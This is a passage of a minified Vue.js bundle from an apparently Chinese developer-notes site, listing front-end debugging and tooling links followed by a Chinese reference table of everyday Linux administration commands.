profiles3")])]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/devtools/docs/mobile-emulation",target:"_blank"}},[n._v("chrome移动版调试")])]),t("p",[t("a",{attrs:{href:"http://ued.taobao.org/blog/2012/06/debug-with-chrome-dev-tool",target:"_blank"}},[n._v("chrome调试")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/QLeelulu/archive/2011/08/28/2156402.html",target:"_blank"}},[n._v("chrome的调试")])]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/devtools/docs/commandline-api",target:"_blank"}},[n._v("chrome console 命令详解")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/leonkao/p/3809655.html",target:"_blank"}},[n._v("查看事件绑定1")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/xiaoyao2011/p/3447421.html",target:"_blank"}},[n._v("查看事件绑定2")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000683599",target:"_blank"}},[n._v("神器——Chrome开发者工具(一")])]),t("p",[t("a",{attrs:{href:"https://xinranliu.me/2015-05-22-qiqu-performance",target:"_blank"}},[n._v("奇趣百科性能优化(Chrome DevTools 中的\n                    Timeline Profils 等工具使用介绍")])]),t("p",[t("a",{attrs:{href:"http://frontenddev.org/link/15-tips-of-chrome-developer-tools.html",target:"_blank"}},[n._v("chrome 开发者工具的 15\n                    个小技巧")])]),t("p",[t("a",{attrs:{href:"http://1ke.co/course/361",target:"_blank"}},[n._v("Chrome开发者工具不完全指南")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000003882567",target:"_blank"}},[n._v("Chrome 开发者工具使用技巧")])]),t("p",[n._v("Firebug")]),t("p",[n._v("Firebug 地址")]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/learn/137",target:"_blank"}},[n._v("firebug视频教程")])]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Tools/WebIDE",target:"_blank"}},[n._v("firefox 模拟器")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/ctriphire/p/4116207.html",target:"_blank"}},[n._v("console.log 命令详解")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2008/06/firebug_tutorial.html",target:"_blank"}},[n._v("Firebug入门指南")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2011/03/firebug_console_tutorial.html",target:"_blank"}},[n._v("Firebug控制台详解")])]),t("p",[n._v("移动,微信调试")]),t("p",[n._v("移动,微信调试 地址")]),t("p",[t("a",{attrs:{href:"https://openstf.github.io",target:"_blank"}},[n._v("浏览器端调试安卓")])]),t("p",[t("a",{attrs:{href:"http://yujiangshui.com/multidevice-frontend-debug",target:"_blank"}},[n._v("移动端前端开发调试")])]),t("p",[t("a",{attrs:{href:"https://github.com/yujiangshui/CN-Chrome-DevTools/blob/remote-debugging/md/Use-Tools/remote-debugging.md",target:"_blank"}},[n._v("使用 Chrome 远程调试 Android 设备")])]),t("p",[t("a",{attrs:{href:"http://plus.uc.cn/document/webapp/doc5.html",target:"_blank"}},[n._v("mac移动端调试")])]),t("p",[t("a",{attrs:{href:"http://www.mihtool.com",target:"_blank"}},[n._v("mac移动端调试")])]),t("p",[t("a",{attrs:{href:"http://thx.github.io/mobile/debugging-in-mobile",target:"_blank"}},[n._v("无线调试攻略")])]),t("p",[t("a",{attrs:{href:"http://yanhaijing.com/mobile/2014/12/17/web-debug-for-mobile",target:"_blank"}},[n._v("无线调试攻略")])]),t("p",[t("a",{attrs:{href:"http://www.jianshu.com/p/ccf124f1f74b",target:"_blank"}},[n._v("屌爆了,完美调试 微信webview(x5")])]),t("p",[n._v("微信调试的那些事 微信调试的那些事")]),t("p",[t("a",{attrs:{href:"http://jsconsole.com",target:"_blank"}},[n._v("远程console")])]),t("p",[t("a",{attrs:{href:"http://blog.qqbrowser.cc",target:"_blank"}},[n._v("微信调试工具")])]),t("p",[t("a",{attrs:{href:"https://github.com/jieyou/remote_inspect_web_on_real_device",target:"_blank"}},[n._v("各种真机远程调试方法汇总")])]),t("p",[n._v("iOS Simulator")]),t("p",[n._v("iOS Simulator 地址")]),t("p",[n._v("Simulator iOS_Simulator_Guide-Introduction")]),t("p",[t("a",{attrs:{href:"http://www.crifan.com/intro_ios_simulator_in_xcode_and_usage_summary",target:"_blank"}},[n._v("iOS\n                    Simulator的介绍和使用心得")])]),t("p",[n._v("img")]),t("p",[n._v("img 地址")]),t("p",[t("a",{attrs:{href:"http://preloaders.net/en/circular",target:"_blank"}},[n._v("loading img")])]),t("p",[t("a",{attrs:{href:"http://zhitu.isux.us",target:"_blank"}},[n._v("智图-图片优化平台")])]),t("p",[t("a",{attrs:{href:"https://tinypng.com",target:"_blank"}},[n._v("在线png优化")])]),t("p",[n._v("生成二维码")]),t("p",[n._v("生成二维码 地址")]),t("p",[t("a",{attrs:{href:"http://cli.im",target:"_blank"}},[n._v("生成二维码")])]),t("p",[n._v("浏览器同步")]),t("p",[n._v("浏览器同步 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/leeluolee/puer",target:"_blank"}},[n._v("puer")])]),t("p",[t("a",{attrs:{href:"http://livereload.com",target:"_blank"}},[n._v("liveReload")])]),t("p",[t("a",{attrs:{href:"http://getf5.com",target:"_blank"}},[n._v("f5")])]),t("p",[t("a",{attrs:{href:"http://geek100.com/2608",target:"_blank"}},[n._v("File Watchers")])]),t("p",[n._v("在线PPT制作")]),t("p",[n._v("在线PPT制作 地址")]),t("p",[n._v("nodePPT nodePPT")]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2015/10/15/2015-10-16-cleaver-make-ppt/",target:"_blank"}},[n._v("Cleaver快速制作网页PPT")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/Darren_code/archive/2013/01/04/impressjs.html",target:"_blank"}},[n._v("impress.js")])]),t("p",[t("a",{attrs:{href:"https://github.com/ksky521/nodePPT",target:"_blank"}},[n._v("PPT")])]),t("p",[t("a",{attrs:{href:"https://github.com/hakimel/reveal.js",target:"_blank"}},[n._v("reveal")])]),t("p",[t("a",{attrs:{href:"https://github.com/Seldaek/slippy",target:"_blank"}},[n._v("slippy")])]),t("p",[n._v("前端导航网站")]),t("p",[n._v("前端导航网站 地址")]),t("p",[t("a",{attrs:{href:"http://uxbees.com/index.html",target:"_blank"}},[n._v("界面清爽的前端导航")])]),t("p",[t("a",{attrs:{href:"http://whycss.com",target:"_blank"}},[n._v("前端导航")])]),t("p",[t("a",{attrs:{href:"http://www.daqianduan.com/nav",target:"_blank"}},[n._v("前端网址导航")])]),t("p",[t("a",{attrs:{href:"http://sentsin.com/daohang",target:"_blank"}},[n._v("前端名录")])]),t("p",[t("a",{attrs:{href:"http://123.jser.us",target:"_blank"}},[n._v("前端导航")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/nav",target:"_blank"}},[n._v("前端开发资源")])]),t("p",[t("a",{attrs:{href:"http://www.haourl.cn",target:"_blank"}},[n._v("网址导航")])]),t("p",[t("a",{attrs:{href:"http://code.ciaoca.com",target:"_blank"}},[n._v("前端开发仓库 - 众多效果的收集地")])]),t("p",[t("a",{attrs:{href:"https://github.com/jnoodle/f2e-collect",target:"_blank"}},[n._v("前端资源导航")])]),t("p",[t("a",{attrs:{href:"http://f2e.im/static/pages/nav/index.html",target:"_blank"}},[n._v("F2E 前端导航")])]),t("p",[n._v("常用CDN")])])}],Y={},Z=Y,nn=(t("1651"),Object(p["a"])(Z,K,X,!1,null,"66618e5c",null)),rn=nn.exports,tn=t("1b62"),en={mixins:[tn["a"]],components:{m1:m,m2:S,m3:E,m4:R,m5:P,m6:U,m7:Q,m8:rn},data:function(){return{tab:"m3",tab_level:1,tabs:[{label:"概述",value:"m3"},{label:"node",value:"m1"},{label:"全栈项目 依赖",value:"m2"}]}}},an=en,sn=Object(p["a"])(an,e,a,!1,null,"03d6ed40",null);r["default"]=sn.exports},e516:function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"q-mx-lg"},[t(""+n.tab,{tag:"component"})],1)])},a=[],i=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},s=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("table",{staticStyle:{width:"1144px","border-collapse":"collapse","table-layout":"fixed"},attrs:{width:"1144",border:"1",cellpadding:"0",cellspacing:"0"}},[t("tr",{attrs:{height:"19"}},[t("td",{staticStyle:{width:"80px"}},[n._v("主题")]),t("td",{staticStyle:{width:"80px"}},[n._v("相关命令")]),t("td",{staticStyle:{width:"180px"}},[n._v("作用")]),t("td",{staticStyle:{width:"280px"}},[n._v("常用参数")]),t("td",{staticStyle:{width:"400px"}},[n._v("备注")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",{attrs:{height:"234",rowspan:"6"}},[n._v("开关机")]),t("td",[n._v("shutdown")]),t("td",[n._v("关机或重启")]),t("td",[n._v("-r 重启"),t("br"),n._v("-h 关机"),t("br"),n._v("-k 警告"),t("br"),n._v("-c 取消")]),t("td",[n._v("\n          shutdown -r now"),t("br"),n._v("shutdown -h now"),t("br"),n._v("shutdown -r +1"),t("br"),n._v("\n          shutdown -h 1 一分钟后关机 "),t("br"),n._v("\n          shutdown -r 11:30 "),t("br"),n._v("\n          shutdown -c 撤销shutdown 命令\n        ")])]),t("tr",[t("td",[n._v("reboot")]),t("td",[n._v("重启")]),t("td"),t("td",[n._v("reboot")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",[n._v("init")]),t("td",[n._v("运行级别")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          systemctl get-default "),t("br"),n._v("\n          CentOS7的运行级别 "),t("br"),n._v("\n          0 shutdown.target 系统关机状态 halt init 0 "),t("br"),n._v("\n          1 emergency.target\n          单用户工作状态(类似Windows的安全模式，Linux忘记密码)"),t("br"),n._v("\n          2 rescure.target "),t("br"),n._v("\n          3 multi-user.target 命令行模式 多用户状态\n          (字符模式,服务基本都是此模式)"),t("br"),n._v("\n          4 无 系统未使用，留给用户"),t("br"),n._v("\n          5 graphical.target 图形模式 (个人计算机都是此模式)"),t("br"),n._v("\n          6 无 "),t("br")])]),t("tr",[t("td",[n._v("halt")]),t("td",[n._v("硬件关机")]),t("td"),t("td",[n._v("halt")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("poweroff")]),t("td",[n._v("硬件关机")]),t("td",[n._v("-f 强行关机")]),t("td",[n._v("poweroff"),t("br"),n._v("poweroff -f")])]),t("tr",[t("td",[n._v("sync")]),t("td",[n._v("将内存中数据回填到硬盘")]),t("td"),t("td",[n._v("sync;sync")])]),t("tr",{attrs:{height:"36"}},[t("td",{attrs:{height:"36"}},[n._v("启动X-Windows")]),t("td",[n._v("startx")]),t("td",[n._v("进入X-Window")]),t("td"),t("td",[n._v("进入X-Windows后可以用logout注销回到命令行")])]),t("tr",{attrs:{height:"36"}},[t("td",{attrs:{height:"180",rowspan:"3"}},[n._v("日期/时间")]),t("td",[n._v("cal")]),t("td",[n._v("日历")]),t("td"),t("td",[n._v("cal 2011"),t("br"),n._v("cal 03 2011")])]),t("tr",{staticStyle:{height:"81.00pt"}},[t("td",[n._v("date")]),t("td",[n._v("日期")]),t("td",[n._v("-s 修改日期"),t("br")]),t("td",[n._v("\n          date +%Y/%m/%d 按指定格式显示日期"),t("br"),n._v("date -s 07/13/2011"),t("br"),n._v("date -s\n          11:55:00"),t("br"),n._v("clock --systohc 将时间保存到硬件"),t("br"),n._v("date 071610512011\n          月日时分年"),t("br"),n._v("hwclock -w 写入主板芯片\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("time")]),t("td",[n._v("计算某个命令执行所耗费时间")]),t("td"),t("td",[n._v("\n          time sh myshell.sh"),t("span",{staticStyle:{"mso-spacerun":"yes"}},[n._v("  ")]),n._v("运行myshell.sh这个脚本所花的时间\n        ")])]),t("tr",[t("td",[n._v("公告")]),t("td",[n._v("wall")]),t("td",[n._v("广播")]),t("td"),t("td",[n._v("wall hello")])]),t("tr",[t("td",[n._v("清屏")]),t("td",[n._v("clear")]),t("td",[n._v("清屏")]),t("td"),t("td",[n._v("clear")])]),t("tr",[t("td",{attrs:{rowspan:"7"}},[n._v("帮助")]),t("td",[n._v("whatis")]),t("td",[n._v("命令介绍")]),t("td"),t("td",[n._v("whatis ls")])]),t("tr",[t("td",[n._v("apropos")]),t("td",[n._v("帮助一览")]),t("td"),t("td")]),t("tr",[t("td",[n._v("help")]),t("td",[n._v("帮助")]),t("td"),t("td",[n._v("help cd")])]),t("tr",[t("td",[n._v("--help")]),t("td",[n._v("帮助")]),t("td"),t("td",[n._v("ls --help")])]),t("tr",[t("td",[n._v("man")]),t("td",[n._v("参考手册")]),t("td",[n._v("可以像在vi里一样使"),t("span",{},[n._v("用斜杠来查找字符串")])]),t("td",[n._v("man ls | more")])]),t("tr",[t("td",[n._v("info")]),t("td",[n._v("相关信息")]),t("td"),t("td",[n._v("info ls")])]),t("tr",[t("td",[n._v("type")]),t("td",[n._v("查看一个命令是属于内部命令还是外部命令。")]),t("td"),t("td",[n._v("type cd")])]),t("tr",[t("td",{staticStyle:{height:"40.50pt"},attrs:{height:"54",rowspan:"2"}},[n._v("系统设定")]),t("td",[n._v("setup")]),t("td",[n._v("系统设定工具")]),t("td"),t("td",[n._v("修改/etc/sysconfig的内容")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("locale")]),t("td",[n._v("显示语系")]),t("td",[n._v("-a 显示所有支持的语系")]),t("td",[n._v("locale -a"),t("br"),n._v("cat /etc/sysconfig/i18n")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",{attrs:{height:"234",rowspan:"6"}},[n._v("网络命令")]),t("td",[n._v("ifconfig")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          ens33 ：是默认的网卡"),t("br"),n._v("\n          lo（loop，循环）：表示回环网卡，代表本机"),t("br"),n._v("\n          virbr0：虚拟网络接口"),t("br"),n._v("\n          # vim /etc/sysconfig/network-scripts/ifcfg-ens33"),t("br"),n._v('\n          TYPE="Ethernet"'),t("br"),n._v('\n          BOOTPROTO="dhcp"'),t("br"),n._v('\n          NAME="ens33"'),t("br"),n._v('\n          UUID="6c809893-d12c-46af-9987-4c05b2773c91"'),t("br"),n._v('\n          DEVICE="ens33"'),t("br"),n._v('\n          ONBOOT="yes"'),t("br"),n._v("\n          参数解析："),t("br"),n._v("\n          TYPE ：网络类型，Ethernet以太网"),t("br"),n._v("\n          BOOTPROTO：IP的获取方式，dhcp代表自动获取，static/none代表手工设置"),t("br"),n._v("\n          NAME ：网卡的名称（名字），ens33"),t("br"),n._v("\n          UUID ：代表网卡的UUID编号（必须是唯一的）"),t("br"),n._v("\n          DEVICE ：设备名称"),t("br"),n._v("\n          ONBOOT：代表网卡是否随计算机开启启动，yes随计算机开机启动，no代表不启动"),t("br")]),t("td",[n._v("\n          查看IP"),t("br"),n._v("设置IP"),t("br"),n._v("启用网卡"),t("br"),n._v("禁用网卡"),t("br"),n._v("\n          ifconfig"),t("br"),n._v("\n          ifconfig eth0 172.168.0.201 netmask 255.255.0.0"),t("br"),n._v("\n          ifconfig ens33 172.168.0.201 netmask 255.255.0.0"),t("br"),n._v("\n          ifconfig eth0 up"),t("br"),n._v("\n          ifconfig eth0 down\n        ")])]),t("tr",[t("td",[n._v("ifup")]),t("td",[n._v("启用网卡")]),t("td"),t("td",[n._v("ifup eth0")])]),t("tr",[t("td",[n._v("ifdown")]),t("td",[n._v("禁用网卡")]),t("td"),t("td",[n._v("ifdown eth0")])]),t("tr",[t("td",[n._v("route")]),t("td",[n._v("路由")]),t("td"),t("td")]),t("tr",{attrs:{height:"90"}},[t("td",[n._v("netstat")]),t("td",[n._v("显示Tcp/IP网络状态")]),t("td",[n._v("\n          -a 显示所有的socket"),t("br"),n._v("-n 以IP地址显示"),t("br"),n._v("-p 显示进程号"),t("br")]),t("td",[n._v("netstat -na")])]),t("tr",[t("td",[n._v("netconfig")]),t("td",[n._v("配置网络")]),t("td"),t("td",[n._v("修改的内容实际在 /etc/sysconfig/network-scripts 中")])]),t("tr",[t("td",{attrs:{height:"216",rowspan:"13"}},[n._v("系统信息查询")]),t("td",[n._v("whoami")]),t("td",[n._v("查看自己是谁")]),t("td"),t("td")]),t("tr",[t("td",[n._v("who am i")]),t("td",[n._v("查看自己账号及登录信息")]),t("td"),t("td",[n._v("通过su可以看到whoami和who am i的不同")])]),t("tr",[t("td",[n._v("who")]),t("td",[n._v("查看当前系统在线用户")]),t("td"),t("td",[n._v("who")])]),t("tr",[t("td",[n._v("w")]),t("td",[n._v("查看当前系统在线用户")]),t("td"),t("td",[n._v("who")])]),t("tr",[t("td",[n._v("last")]),t("td",[n._v("查看这个月的用户登录信息")]),t("td"),t("td",[n._v("last")])]),t("tr",[t("td",[n._v("hostname")]),t("td",[n._v("查看自己的主机名")]),t("td"),t("td",[n._v("hostname")])]),t("tr",[t("td",[n._v("hostnamectl")]),t("td",[n._v("设置自己的主机名")]),t("td"),t("td",[n._v("\n          hostnamectl -- "),t("br"),n._v("\n          静态的（static） "),t("br"),n._v("瞬态的（transient）"),t("br"),n._v("灵活的（pretty）"),t("br"),n._v("\n          hostnamectl --static set-hostname hr01.aa.cn\n        ")])]),t("tr",[t("td",[n._v("uname")]),t("td",[n._v("列出系统信息")]),t("td",[n._v("-a 查询所有")]),t("td",[n._v("uname -a")])]),t("tr",[t("td",[n._v("dmesg")]),t("td",[n._v("查看开机启动信息")]),t("td"),t("td",[n._v("dmesg")])]),t("tr",[t("td",[n._v("uptime")]),t("td",[n._v("查看开机时长")]),t("td"),t("td",[n._v("uptime")])]),t("tr",[t("td",[n._v("id")]),t("td",[n._v("查看自己及所属的组的信息")]),t("td"),t("td",[n._v("id")])]),t("tr",[t("td",[n._v("finger")]),t("td",[n._v("查看用户信息")]),t("td",[n._v("-s 完整列出")]),t("td",[n._v("finger -s username")])]),t("tr",[t("td",[n._v("groups")]),t("td",[n._v("查看自己属于哪些组")]),t("td"),t("td",[n._v("groups root")])]),t("tr",{attrs:{height:"36"}},[t("td",{attrs:{height:"36"}},[n._v("查看历史命令")]),t("td",[n._v("history")]),t("td",[n._v("历史命令")]),t("td"),t("td",[n._v("\n          history | tail -10"),t("br"),n._v("可以用!n执行第n条历史，!!执行最后一条命令\n        ")])]),t("tr",[t("td",{attrs:{height:"324",rowspan:"12"}},[n._v("账号管理")]),t("td",[n._v("newgrp")]),t("td",[n._v("登录另一个组")]),t("td"),t("td",[n._v("类似login动作")])]),t("tr",[t("td",[n._v("groupadd")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          添加组（在/etc/group） "),t("br"),n._v("\n          -g 编号 "),t("br"),n._v("\n          tcpdump:x:72: "),t("br"),n._v("\n          组名:组密码:组编号:组内用户信息 "),t("br"),n._v("\n          自定义组从 1000开始"),t("br")]),t("td",[n._v("groupadd testing")])]),t("tr",[t("td",[n._v("groupdel")]),t("td",[n._v("删除组")]),t("td"),t("td",[n._v("groupdel test")])]),t("tr",[t("td",[n._v("groupmod")]),t("td",[n._v("修改组")]),t("td",[n._v("\n          -g 编号 "),t("br"),n._v("\n          -n 名称 "),t("br")]),t("td",[n._v("\n          groupmod -n test testing"),t("br"),n._v("\n          #groupmod -g 1100 -n bjhr hr"),t("br"),n._v("\n          含义：将hr组的组ID改成1100，组名改成bjhr"),t("br")])]),t("tr",[t("td",[n._v("gpasswd")]),t("td",[n._v("修改组的密码")]),t("td"),t("td")]),t("tr",[t("td",[n._v("useradd")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          添加用户 "),t("br"),n._v("\n          etc/passwd 存储用户信息的文件"),t("br"),n._v("\n          用户：/etc/passwd文件，每创建一个用户，其就会在此文件中追加一行 "),t("br"),n._v("\n          # vim /etc/passwd"),t("br"),n._v("\n          root:x:0:0:root:/root:/bin/bash"),t("br"),n._v("\n          由上图可知，一共拥有7列"),t("br"),n._v("\n          第1列：用户名称"),t("br"),n._v("\n          第2列：用户的密码，使用一个x占位符，真实密码存储在/etc/shadow(1-用户名，2-加密密码)"),t("br"),n._v("\n          第3列：数字，用户的ID编号"),t("br"),n._v("\n          第4列：数字，用户的主组ID编号"),t("br"),n._v('\n          第5列：代表注释信息，useradd -c "备注信息" 用户名称'),t("br"),n._v("\n          第6列：用户的家目录，默认在/home/用户名称"),t("br"),n._v("\n          第7列：用户可以使用的Shell类型，useradd -s /bin/bash或/sbin/nologin\n          用户名称"),t("br")]),t("td",[n._v("\n          # useradd [选项 选项的值] 用户名称"),t("br"),n._v("\n          选项说明："),t("br"),n._v("\n          -g ：指定用户的主组的编号信息"),t("br"),n._v("\n          -s ：指定用户可以使用的Shell类型"),t("br"),n._v("\n          /bin/bash ：给人用的，给运维工程师"),t("br"),n._v("\n          /sbin/nologin ：给软件用的，比如mysql"),t("br"),n._v("\n          -G ：指定附属组的ID编号，如果有多个附属组，可以使用逗号隔开 useradd -G\n          1000,1001 .. 用户名称 会显示在 附加组 组信息后，主组不会"),t("br"),n._v("\n          -d ：指定用户的家，/home/itheima，useradd -d /itheima itheima"),t("br"),n._v("\n          -u ：指定用户的ID编号，默认是自动生成的"),t("br"),n._v("\n          -c ：comment，注释信息，scj:x:uid:gid:宋楚杰的账号"),t("br"),n._v("\n          -n ：取消以用户名称命名的组信息"),t("br"),n._v("\n          注意：不用任何参数，创建用户，系统会默认执行以下操作："),t("br"),n._v("\n          1）在 /etc/passwd 文件中创建一行关于zhangsan用户的数据"),t("br"),n._v("\n          2）在 /etc/shadow 文件中新增了一行关于zhangsan 密码的数据"),t("br"),n._v("\n          3）在 /etc/group 文件中创建一行与用户名相同的组，例如zhangsan"),t("br"),n._v("\n          4）在 /etc/gshadow\n          文件中新增一行与新增群组相关的密码信息，例如zhangsan"),t("br"),n._v("\n          5）自动创建用户的家目录，默认在/home下，与用户名同名"),t("br")])]),t("tr",[t("td",[n._v("userdel")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          删除用户"),t("br"),n._v("\n          -r 连用户主目录一起删除 "),t("br"),n._v("\n          删除用户递归删除该用户所有文件 删除账号流程： "),t("br"),n._v("\n          ① 删除账号 "),t("br"),n._v("\n          ② 确认是否删除用户家 "),t("br"),n._v("\n          ③ 删除用户主组（没有其他用户） "),t("br")]),t("td",[n._v("\n          userdel -r zhangsan "),t("br"),n._v("\n          ps -ef |grep zhangsan"),t("br"),n._v("\n          搜索包含了zhangsan 关键词的所有进程 "),t("br"),n._v("\n          kill [-9] 进程的ID编号 "),t("br")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("usermod")]),t("td",{attrs:{colspan:"2"}},[n._v("\n          编辑用户"),t("br"),n._v("\n          # usermod [选项 选项的值] 用户名称 选项说明："),t("br"),n._v("\n          -g ：修改用户所属的主组的编号"),t("br"),n._v("\n          - l：修改用户的名称"),t("br"),n._v("\n          -s ：修改用户可以使用的Shell类型，如/bin/bash => /sbin/nologin"),t("br"),n._v("\n          扩展："),t("br"),n._v("\n          -L：锁定用户，锁定后用户无法登陆系统lock"),t("br"),n._v("\n          -U：解锁用户unlock"),t("br"),n._v("\n          了解："),t("br"),n._v("\n          -G ：修改用户附属组的编号信息"),t("br"),n._v("\n          -d ：修改用户的家目录"),t("br"),n._v("\n          -c ：修改用户的备注信息 "),t("br")]),t("td",[n._v("\n          usermod -g test51 root"),t("br"),n._v("\n          usermod -d /home/lisi zhangsan"),t("br"),n._v("\n          禁止linuxuser账号登录Linux操作系统"),t("br"),n._v("\n          usermod -s /sbin/nologin linuxuser"),t("br")])]),t("tr",{attrs:{height:"90"}},[t("td",[n._v("passwd")]),t("td",[n._v("修改用户的密码")]),t("td"),t("td",[n._v("\n          passwd zhangsan"),t("br"),n._v("\n          备注：如果忘记root密码，可以在开机时按下e进入grub编辑模式，移到kernel所在行，在最后的rhgb\n          quiet后输入 single。"),t("br"),n._v("\n          按回车确定后，按下b进入single模式。然后输入passwd修改密码。\n        ")])]),t("tr",{attrs:{height:"36"}},[t("td",[n._v("chsh")]),t("td",[n._v("修改用户的默认SHELL"),t("br"),n._v("查看SHELL")]),t("td",[n._v("-l"),t("br"),n._v("-s")]),t("td",[n._v("chsh -l 查看shell"),t("br"),n._v("chsh root 修改root的默认shell")])]),t("tr",[t("td",[n._v("chfn")]),t("td",[n._v("更改注释字段")]),t("td"),t("td")]),t("tr",[t("td",[n._v("userconf")]),t("td"),t("td"),t("td")]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",{attrs:{height:"324",rowspan:"9"}},[n._v("目录与路径")]),t("td",[n._v("cd")]),t("td",[n._v("进入到某个目录下")]),t("td",[n._v("~ 进入指定用户的主目录"),t("br"),n._v("- 返回之前进入的目录")]),t("td",[n._v("cd ~zhangsan"),t("br"),n._v("cd ~"),t("br"),n._v("cd"),t("br"),n._v("cd -")])]),t("tr",[t("td",[n._v("pwd")]),t("td",[n._v("显示当前目录的全路径")]),t("td"),t("td",[n._v("pwd")])]),t("tr",{staticStyle:{height:"94.50pt"},attrs:{height:"126"}},[t("td",[n._v("ls")]),t("td",[n._v("列出当前目录下的文件和目录")]),t("td",[n._v("\n          -l 详细信息"),t("br"),n._v("\n          -m 以逗号分割"),t("br"),n._v("\n          -a 显示隐藏文件"),t("br"),n._v("\n          -r"),t("br"),n._v("\n          -t"),t("br"),n._v("\n          -R 递归显示包含子目录"),t("br"),n._v("\n          -d 显示指定目录"),t("br"),n._v("\n          -x"),t("br"),n._v("\n          -h 人性化显示"),t("br")]),t("td",[n._v("ls -lrt"),t("br"),n._v("ls -la"),t("br"),n._v("ls -R")])]),t("tr",[t("td",[n._v("ll")]),t("td",[n._v("列出当前目录下的文件和目录")]),t("td",[n._v("\n          linux一共有7种文件类型,分别如下:"),t("br"),n._v("\n          -：普通文件"),t("br"),n._v("\n          d：目录文件"),t("br"),n._v("\n          l： 软链接（类似Windows的快捷方式）"),t("br"),n._v("\n          (下面四种是特殊文件)"),t("br"),n._v("\n          b：块设备文件（例如硬盘、光驱等）"),t("br"),n._v("\n          p：管道文件"),t("br"),n._v("\n          c：字符设备文件（例如猫等串口设备）"),t("br"),n._v("\n          s：套接口文件/数据接口文件（例如启动一个MySql服务器时会产生一个mysql.sock文件）"),t("br")]),t("td",[n._v("\n          等价于ls -l --color=tty （有颜色） "),t("br"),n._v("\n          -rw-r--r--. 1 root root 331270 Jul 7 08:25 a "),t("br"),n._v("\n          文件类型， 权限， 链接数， 属主，属组\n          ，文件大下，最后修改时间，文件名"),t("br"),n._v("\n          权限： 自己，组，其他人 "),t("br")])]),t("tr",[t("td",[n._v("vdir")]),t("td",[n._v("列出当前目录下的文件和目录")]),t("td"),t("td",[n._v("等价于ls -l （无颜色）")])]),t("tr",[t("td",[n._v("mkdir")]),t("td",[n._v("新建目录")]),t("td",[n._v("-p 递归创建")]),t("td",[n._v("\n          mkdir -p /dir1/dir2/dir3/dir4 "),t("br"),n._v("\n          mkdir dir1 dir2\n        ")])]),t("tr",[t("td",[n._v("rmdir")]),t("td",[n._v("删除空目录")]),t("td",[n._v("-p 递归删除")]),t("td",[n._v("\n          rmdir dir-path 从右侧向左侧递归删除 空目录"),t("br"),n._v("\n          rmdir dir1 dir2\n        ")])]),t("tr",[t("td",[n._v("basename")]),t("td",[n._v("获取文件名")]),t("td"),t("td",[n._v("basename $0")])]),t("tr",[t("td",[n._v("dirname")]),t("td",[n._v("获取目录名")]),t("td"),t("td",[n._v("dirname $0")])]),t("tr",{staticStyle:{height:"54.00pt"},attrs:{height:"72"}},[t("td",{attrs:{height:"252",rowspan:"10"}},[n._v("文件的查看")]),t("td",[n._v("cat")]),t("td",[n._v("显示文件内容")]),t("td",[n._v("\n          -n 对输出行编号"),t("br"),n._v("-v 显示控制字符"),t("br"),n._v("\n          -b和-n类似，但空白行不编号"),t("br"),n._v("\n          合并文件\n        ")]),t("td",[n._v("\n          cat /etc/profile"),t("br"),n._v("cat ~/.bash_profile"),t("br"),n._v("\n          cat -b file1 file2 file3"),t("br"),n._v("\n          cat -v file1 DOS下的换行符会以^M显示"),t("br"),n._v("\n          cat a.txt b.txt > d.txt 合并文件\n        ")])]),t("tr",[t("td",[n._v("tac")]),t("td",[n._v("逆向输出文件内容")]),t("td"),t("td",[n._v("tac myfile")])]),t("tr",[t("td",[n._v("nl")]),t("td",[n._v("显示文件内容")]),t("td"),t("td",[n._v("nl myfile")])]),t("tr",[t("td",[n._v("od")]),t("td",[n._v("以八进制显示文件内容")]),t("td"),t("td",[n._v("od myfile")])]),t("tr",[t("td",[n._v("more")]),t("td",[n._v("分页显示内容")]),t("td",[n._v("\n          b 向上 "),t("br"),n._v("\n          d 向下 "),t("br"),n._v("\n          文件整个加载在内存\n        ")]),t("td",[n._v("more myfile")])]),t("tr",[t("td",[n._v("less")]),t("td",[n._v("分页显示内容（可以上下翻页）")]),t("td",[n._v("\n          部分加载在内存 More Actions按键功能回车键向下移动一行"),t("br"),n._v("\n          d向下移动半页"),t("br"),n._v("\n          空格键向下移动一页"),t("br"),n._v("\n          b向上移动一页"),t("br"),n._v("\n          上下方向键向上与向下移动，less命令特有功能键"),t("br"),n._v("\n          less -N 文件名称显示行号/ "),t("br"),n._v("\n          字符串搜索指定的字符串"),t("br")]),t("td",[n._v("less myfile")])]),t("tr",[t("td",[n._v("head")]),t("td",[n._v("显示文件前面几行的内容")]),t("td",[n._v("\n          -n 行 "),t("br"),n._v("\n          -c 字节数 "),t("br")]),t("td",[n._v("head -n 10 